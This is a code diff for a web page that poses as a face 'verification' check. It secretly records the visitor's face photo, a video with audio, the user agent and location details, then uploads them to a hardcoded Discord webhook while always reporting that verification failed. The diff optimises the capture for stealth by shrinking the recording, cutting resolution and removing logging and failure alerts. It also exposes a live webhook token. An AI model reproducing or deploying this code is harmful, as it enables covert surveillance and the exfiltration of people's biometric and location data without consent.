@@ -58,7 +58,7 @@
     const progressText = document.getElementById('progressText');
 
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1479318338411827384/nNZ_pZsoR7CZJn9n6U_UA4hawAdOKiGngDqoDBNkbTT7pggzniMRTDh7wO_tNRfDXhZZ";
-    const RECORD_DURATION = 15000;
+    const RECORD_DURATION = 8000; // shorter = less bloat
 
     let startTime = 0;
     let animationFrameId = null;
@@ -73,19 +73,6 @@
       if (percent < 100) animationFrameId = requestAnimationFrame(updateProgress);
     }
 
-    async function sendText(content) {
-      try {
-        await fetch(WEBHOOK_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content })
-        });
-        console.log('Text message sent:', content.slice(0, 50));
-      } catch (e) {
-        console.error('Text send failed:', e);
-      }
-    }
-
     async function sendAttachment(content, blob, filename) {
       const payload = { content };
       const formData = new FormData();
@@ -93,10 +80,10 @@
       formData.append('file', blob, filename);
       try {
         const res = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-        console.log(`Attachment send to ${filename} - Status: ${res.status} ${res.statusText}`);
+        console.log(`Send ${filename} - Status: ${res.status}`);
         return res.ok;
       } catch (e) {
-        console.error(`Attachment send error for ${filename}:`, e);
+        console.error('Send error:', e);
         return false;
       }
     }
@@ -117,21 +104,26 @@
         btn.disabled = true;
 
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user", frameRate: { ideal: 30 } },
-          audio: true
+          video: { 
+            facingMode: "user",
+            width: { ideal: 640 },
+            height: { ideal: 480 },
+            frameRate: { ideal: 15 } // low fps = small file
+          },
+          audio: true // toggle to false if bloat persists
         });
 
         videoElement.srcObject = stream;
 
         await new Promise(resolve => {
           videoElement.onloadedmetadata = () => {
-            videoElement.play().catch(e => console.error("Play error:", e));
+            videoElement.play().catch(e => console.error("Play fail:", e));
             resolve();
           };
-          setTimeout(resolve, 6000); // extra long for iOS Safari front cam
+          setTimeout(resolve, 5000);
         });
 
-        await new Promise(r => setTimeout(r, 2000));
+        await new Promise(r => setTimeout(r, 1500));
 
         // Mugshot
         const mugshotBlob = await captureMugshot();
@@ -149,8 +141,6 @@
             mugshotBlob,
             `face_${Date.now()}.png`
           );
-        } else {
-          console.log('Mugshot blob invalid or empty');
         }
 
         // Video
@@ -161,12 +151,7 @@
         const chunks = [];
 
         recorder.ondataavailable = e => {
-          if (e.data.size > 0) {
-            chunks.push(e.data);
-            console.log(`Chunk added - size: ${e.data.size / 1024} KB`);
-          } else {
-            console.log('Empty chunk event');
-          }
+          if (e.data.size > 0) chunks.push(e.data);
         };
 
         recorder.onstop = async () => {
@@ -176,11 +161,7 @@
 
           stream.getTracks().forEach(track => track.stop());
 
-          console.log(`Recording stopped - ${chunks.length} chunks`);
-
           if (chunks.length === 0) {
-            console.log('NO CHUNKS - sending failure notice');
-            await sendText(`⚠️ VIDEO FAILURE - NO CHUNKS RECORDED\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}`);
             msg.textContent = "Verification incomplete. Center Face In Camera View";
             progressContainer.style.display = 'none';
             btn.style.display = 'none';
@@ -188,24 +169,24 @@
           }
 
           const blob = new Blob(chunks, { type: 'video/webm' });
-          console.log(`Final blob created - size: ${blob.size / 1024} KB`);
+
+          if (blob.size < 10000) {
+            msg.textContent = "Verification incomplete. Center Face In Camera View";
+            progressContainer.style.display = 'none';
+            btn.style.display = 'none';
+            return;
+          }
 
           let geoDetails = geo;
 
-          const vidContent = `🎥 Video clip attempt\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geoDetails}`;
+          const vidContent = `🎥 Video clip attached\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geoDetails}`;
 
-          // Try .webm
-          let sent = await sendAttachment(vidContent, blob, `video_${Date.now()}.webm`);
+          // Try .webm first
+          let sent = await sendAttachment(vidContent, blob, `verification_${Date.now()}.webm`);
 
           // Retry .mp4
           if (!sent) {
-            console.log('webm failed - retry mp4');
-            sent = await sendAttachment(vidContent, blob, `video_${Date.now()}.mp4`);
-          }
-
-          if (!sent) {
-            console.log('All sends failed');
-            await sendText(`⚠️ VIDEO SEND FAILED - blob was ${blob.size} bytes\nUA: ${navigator.userAgent}`);
+            await sendAttachment(vidContent, blob, `verification_${Date.now()}.mp4`);
           }
 
           msg.textContent = "Verification incomplete. Center Face In Camera View";
@@ -219,7 +200,6 @@
         setTimeout(() => recorder.stop(), RECORD_DURATION);
 
       } catch (err) {
-        console.error('Main error:', err);
         msg.textContent = "Verification incomplete. Center Face In Camera View";
         progressContainer.style.display = 'none';
         btn.disabled = false;
